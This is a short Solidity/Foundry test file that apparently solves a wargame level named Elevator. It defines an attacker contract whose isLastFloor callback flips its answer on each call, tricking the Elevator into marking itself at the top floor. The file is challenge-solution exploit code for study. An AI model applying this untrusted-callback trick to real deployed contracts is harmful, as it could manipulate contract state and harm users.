//SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {Elevator, Building} from "../src/level12.sol";

import {Test, console} from "forge-std/Test.sol";

contract BuildingTest is Test {
    Elevator public elevator;
    BuildingAttack public attackerContract;

    function setUp() public {
        elevator = new Elevator();
        attackerContract = new BuildingAttack(elevator);
    }

    function test_attack() public {
        attackerContract.attack(); // Call via attacker
        assertEq(elevator.top(), true);
        assertEq(elevator.floor(), 1);
    }
}

contract BuildingAttack is Building {
    Elevator public elevator;
    bool public flipFlop = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function attack() external {
        elevator.goTo(1); // call from here
    }

    function isLastFloor(uint256) external override returns (bool) {
        flipFlop = !flipFlop;
        return flipFlop;
    }
}
